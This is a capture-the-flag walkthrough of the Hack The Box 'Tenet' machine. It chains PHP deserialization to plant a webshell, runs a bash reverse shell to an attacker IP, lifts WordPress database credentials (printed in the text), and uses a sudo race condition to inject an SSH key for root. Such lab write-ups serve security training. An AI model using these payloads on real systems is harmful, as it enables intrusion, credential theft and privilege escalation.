# [Tenet](https://app.hackthebox.com/machines/tenet)

```bash
nmap -p- --min-rate 10000 10.10.10.223 -Pn
```

![alt text](img/image.png)


After detection of open ports, let's do greater nmap scan here.

```bash
nmap -A -sC -sV -p22,80 10.10.10.223 -Pn
```

![alt text](img/image-1.png)


While browsing `Wordpress` website, I see `tenet.htb` domain.

![alt text](img/image-2.png)


Let's add this into `/etc/hosts` file for resolving purposes.


Let's do `Subdomain Enumeration` via `wfuzz` command.
```bash
wfuzz -c -H "Host: FUZZ.tenet.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.223 --hh 10918
```

![alt text](img/image-3.png)


I add `www.tenet.htb` domain name also into `/etc/hosts` file.


Our `tenet.htb` application is like below.

![alt text](img/image-4.png)


Let's do `Directory Enumeration` for `tenet.htb` web application.
```bash
gobuster dir -u http://tenet.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 40 -x php,txt,bak
```

![alt text](img/image-5.png)


Now, it's time to enumerate web application. I find a comment for one blog says information leakage.

![alt text](img/image-6.png)


Let's look at `sator.php` and `sator.php.bak` files on `tenet.htb`, but can't find anything.

I found these files by resolving ip address itself.


Let's look at old `sator.php` file.

![alt text](img/image-7.png)


While I browse `sator.php` file, it says such comments on web application.

![alt text](img/image-8.png)


From `sator.php.bak` file, I see that there's `serialized` keyword is used, it means there can be `Insecure Deserialization` attack.


Let's write webshell code for `DatabaseExport` class.
```php
<?php

class DatabaseExport {

    public $user_file = "dr4ks.php";
    public $data = '<?php system($_REQUEST["cmd"]); ?>';

}

$sploit = new DatabaseExport;
echo serialize($sploit);
?>
```


While I run this code `php dr4ks.php`, it gives me such output.

![alt text](img/image-9.png)


Let's upload our malicious file into web application via `curl` command and we should make `URL Encoding`.

```bash
curl -G http://10.10.10.223/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"dr4ks.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}'
```

![alt text](img/image-10.png)


Let's check that our `webshell` is located or not by browsing.
```bash
curl http://10.10.10.223/dr4ks.php?cmd=id
```

![alt text](img/image-11.png)


It's time to add reverse shell payload into command section.

```bash
curl -X GET http://10.10.10.223/dr4ks.php -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.18/1337 0>&1"'
```

![alt text](img/image-12.png)


I got reverse shell from port `1337`.

![alt text](img/image-13.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg 
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-14.png)


I find `wp-config.php` file on `/var/www/html/wordpress` directory which contains sensitive credentials.

![alt text](img/image-15.png)


neil: Opera2112


Let's connect into machine via `ssh`.

user.txt

![alt text](img/image-16.png)


While I look at privileges of this user via `sudo -l` command, I see `enableSSH.sh` script.

![alt text](img/image-17.png)


I see `addKey()` function is located here, I need to abuse this for entering my public key (id_rsa.pub) file.


![alt text](img/image-18.png)


Let's inject our pubcliy (id_rsa.pub) file as below to make `Race Condition` vulnerability.
```bash
while true; do for fn in /tmp/ssh-*; do echo "{public_key}" > $fn; done; done
```

![alt text](img/image-19.png)

Note: But, we need to run `sudo enableSSH.sh` this on another  terminal due to abusing `Race Condition` vulnerability.

![alt text](img/image-20.png)


From above image, I need to see `Error in creating key file!` word after this I can login into machine for `root` account by using my private key (id_rsa) file.


root.txt

![alt text](img/image-21.png)
